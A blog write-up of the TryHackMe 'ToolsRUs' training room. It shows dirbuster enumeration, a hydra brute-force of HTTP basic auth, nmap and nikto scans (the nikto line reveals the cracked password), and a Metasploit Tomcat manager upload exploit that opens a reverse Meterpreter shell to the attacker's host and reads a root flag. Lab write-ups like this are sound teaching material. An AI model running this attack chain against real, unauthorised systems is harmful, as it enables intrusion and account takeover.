---
layout: post
title: TryHackMe - ToolsRUs
---

This is a writeup to the [ToolsRus Room](https://tryhackme.com/room/toolsrus) on TryHackMe.com. The goal is to practice using dirbuster, hydra, nmap, nikto and metasploit. The challenge is to use the tools to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.

* What directory can you find, that begins with a "g"?
  * Use dirbuster with the directory-list-lowercase-2.3-medium.txt wordlist and find the guidelines directory.
* Whose name can you find from this directory?
  * Inside that directory is a message: "Hey bob, did you update that TomCat server?"
* What directory has basic authentication?
  * Eventually the "protected" directory shows up in dirbuster.
* What is bob's password to the protected part of the website?
	```
	kali@kali:~$ hydra -l bob -P rockyou.txt 10.10.70.1 http-get /protected
	...
	[DATA] attacking http-get://10.10.70.1:80/protected
	[80][http-get] host: 10.10.70.1   login: bob   password: <censored>
	1 of 1 target successfully completed, 1 valid password found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-16 00:54:44
	```
* What other port that serves a web service is open on the machine? Going to the service running on that port, what is the name and version of the software? What version of Apache-Coyote is this service using? What version of Apache-Coyote is this service using?
	```
	kali@kali:~$ nmap 10.10.70.1 -A
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 a1:d2:2d:75:f2:94:5d:c2:51:b4:21:4f:8a:6a:b3:f2 (RSA)
	|   256 7e:c6:52:14:6f:b1:3c:eb:42:21:4c:b1:6e:79:32:f3 (ECDSA)
	|_  256 2e:95:75:35:15:2e:67:82:2c:98:4a:c3:9d:e3:ec:55 (ED25519)
	80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).
	1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
	|_http-favicon: Apache Tomcat
	|_http-server-header: Apache-Coyote/1.1
	|_http-title: Apache Tomcat/7.0.88
	8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
	|_ajp-methods: Failed to get a valid response for the OPTION request
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	```
* Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.
	```
	kali@kali:~$ nikto -host http://10.10.70.1:1234/manager/html -id bob:bubbles
	- Nikto v2.1.6
	---------------------------------------------------------------------------
	+ Target IP:          10.10.70.1
	+ Target Hostname:    10.10.70.1
	+ Target Port:        1234
	+ Start Time:         2020-11-16 01:08:20 (GMT-5)
	---------------------------------------------------------------------------
	+ Server: Apache-Coyote/1.1
	...
	```
* How many documentation files did Nikto identify?
  * Nikto took a very long time, but eventually discovered 5 files.
* Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as, and what text is in the file /root/flag.txt?
	```
	$ msfconsole -q
	msf5 > search name:tomcat type:exploit
	... # tried out multiple exploits, eventually found one that worked
	... # set options based on previously found username:password and RPORT
	msf5 exploit(multi/http/tomcat_mgr_upload) > run

	[*] Started reverse TCP handler on 10.14.4.59:4444 
	[*] Retrieving session ID and CSRF token...
	[*] Uploading and deploying ycK4cqc...
	[*] Executing ycK4cqc...
	[*] Sending stage (53944 bytes) to 10.10.70.1
	[*] Undeploying ycK4cqc ...
	[*] Meterpreter session 1 opened (10.14.4.59:4444 -> 10.10.70.1:44042) at 2020-11-16 01:24:34 -0500
	meterpreter > shell
	Process 1 created.
	Channel 1 created.
	whoami
	root
	cat /root/flag.txt
	<censored>
	```
